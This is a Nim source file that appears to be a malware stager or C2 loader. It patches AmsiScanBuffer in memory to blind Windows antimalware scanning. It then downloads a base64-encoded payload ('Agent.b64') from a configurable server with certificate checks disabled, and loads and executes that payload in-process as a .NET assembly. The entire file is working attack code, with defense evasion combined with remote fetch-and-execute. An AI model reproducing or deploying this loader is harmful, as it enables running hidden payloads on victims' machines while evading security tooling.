import httpclient
import std/base64
import winim/clr
import strformat
import std/net

import winim/lean
import dynlib
import strenc

const ServerPort {.intdefine.}: int = 80
const ServerProtocol {.strdefine.}: string = "http"
const ServerAddress {.strdefine.}: string = "192.168.56.102"
const FileName {.strdefine.}: string = "Agent.b64"
const DotNetParams {.strdefine.}: string = "https:192.168.56.102:443"

func toByteSeq*(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))

when defined amd64:
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


var url = ServerProtocol & "://" & ServerAddress & ":" & $ServerPort & "/"  &  FileName
var httpClt = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
var content = httpClt.getContent(url)
let decoded = decode(content)
var bytes = toByteSeq(decoded)


var success = PatchAmsi()

var assembly = load(bytes)

var arr = toCLRVariant([DotNetParams], VT_BSTR) # Actually passing some args
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
